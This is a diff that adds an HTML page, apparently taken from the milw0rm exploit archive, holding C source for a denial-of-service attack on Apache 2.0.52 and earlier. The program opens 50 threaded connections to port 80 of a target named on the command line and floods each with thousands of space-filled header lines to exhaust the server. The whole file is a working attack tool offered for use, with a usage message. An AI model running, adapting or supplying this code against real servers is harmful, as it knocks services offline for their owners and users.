@@ -1,0 +1,100 @@
+<html><head><title>Apache 2.0.52 Multiple Space Header DoS (c code)</title></head><pre>/// Apache 2.0.52 and earlier DoS - Chintan Trivedi &lt;chesschintan@gmail.com&gt;
+
+#include &quot;stdafx.h&quot;
+#include &quot;winsock.h&quot;
+#include &quot;string.h&quot;
+#include &quot;stdio.h&quot;
+#include &quot;windows.h&quot;
+#pragma comment(lib,&quot;ws2_32&quot;)
+
+DWORD WINAPI attack(LPVOID);
+char target[256];
+
+int main(int argc, char* argv[])
+{
+       int l=0;
+       int j;
+       DWORD dw;
+       HANDLE hd;
+       if(argc&lt;2)
+       {
+               printf(&quot;usage: %s target&quot;, argv[0]);
+               exit(0);
+       }
+
+       strncpy(target, argv[1], 256);
+       printf(&quot;Attaching %s ...\n&quot;, target);
+       for(j=0;j&lt;50;j++)
+               hd=CreateThread(NULL,0, attack, (LPVOID) l , 0, &amp;dw);
+
+       for(j=0;j&lt;50;j++)
+               WaitForSingleObject(hd, INFINITE);
+
+       printf (&quot;done&quot;);
+       return 0;
+}
+
+DWORD WINAPI attack(LPVOID l)
+{
+       int s;
+       SOCKADDR_IN sck;
+       HOSTENT *host;
+       char buff[256];
+       char space[8000];
+       int i;
+
+       WSADATA wsadata;
+
+       WSAStartup(MAKEWORD(1,1),&amp;wsadata);
+
+       memset(space, ' ', 8000);
+       space[7998]='\n';
+       space[7999]='\0';
+
+       if((host=gethostbyname(target))==NULL)
+       {
+               printf(&quot;Host not found&quot;);
+               return -1;
+       }
+       sck.sin_family = PF_INET;
+       memcpy(&amp;sck.sin_addr.s_addr, host-&gt;h_addr, host-&gt;h_length );
+       sck.sin_port = htons(80);
+
+       if((s=socket(AF_INET,SOCK_STREAM,0))==-1)
+       {
+               printf(&quot;Socket couldn't be initiallized&quot;);
+               return -1;
+       }
+       if((connect(s,(struct sockaddr *)&amp;sck,sizeof(sck))))
+       {
+               printf(&quot;Couldn't connect&quot;);
+               return -1;
+       }
+
+       sprintf(buff, &quot;GET / HTTP/1.0\n&quot;);
+       //printf(&quot;%s&quot;,buff);
+       int len=strlen(buff);
+
+       if((send(s,buff,len,0))==-1)
+       {
+               printf (&quot;send error&quot;);
+               closesocket(s);
+               return -1;
+       }
+
+       for(i=0;i&lt;9999;i++)
+       {
+
+               if((send(s,space,strlen(space),0))==-1)
+               {
+                       printf(&quot;Send Error on header number %d&quot;, i);
+                       closesocket(s);
+                       return -1;
+               }
+
+       }
+       closesocket(s);
+       return 0;
+}
+
+// milw0rm.com [2004-11-02]</pre></html>
